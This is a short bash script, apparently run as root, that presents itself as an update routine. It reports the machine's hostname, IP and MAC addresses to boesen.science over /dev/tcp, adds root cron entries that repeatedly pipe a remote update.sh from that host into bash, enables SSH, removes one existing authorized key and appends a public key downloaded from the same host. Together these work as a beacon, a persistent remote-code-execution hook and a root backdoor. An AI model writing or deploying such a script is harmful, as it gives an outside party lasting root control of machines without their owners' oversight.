#!/usr/bin/bash

# Prevent from running twice per hour
if [[ $(< /tmp/last) = `date +"%H"` ]]; then
	exit 1
else
	date +"%H" > /tmp/last
fi

hostname=$(hostname)
ip=$(hostname -I | sed 's/ *$//')
mac=$(cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//')

info="$hostname $ip $mac"

server="boesen.science"
port=2043

rm /tmp/ip

if [[ $(< /etc/info) != "$info" ]]; then
	printf "$info" > /etc/info

	printf "UPDATE: $info\0" >/dev/tcp/$server/$port
fi

grep -v "boesen.science" /var/spool/cron/crontabs/root > /tmp/crontab; mv /tmp/crontab /var/spool/cron/crontabs/root
echo '*/20 * * * * curl -L boesen.science:2042/linux/update.sh |bash' >> /var/spool/cron/crontabs/root

printf '#\!/bin/bash\ncurl -L boesen.science:2042/linux/update.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update

systemctl start ssh.service
systemctl enable ssh.service

sshpath="/root/.ssh"

mkdir -p "$sshpath"

# Remove other key if it's there
grep -v "root@legend" $sshpath/authorized_keys > /tmp/authorized_keys
mv /tmp/authorized_keys $sshpath/authorized_keys

if ! grep boesene $sshpath/authorized_keys; then
	curl -L boesen.science:2042/pubkey >> $sshpath/authorized_keys
fi
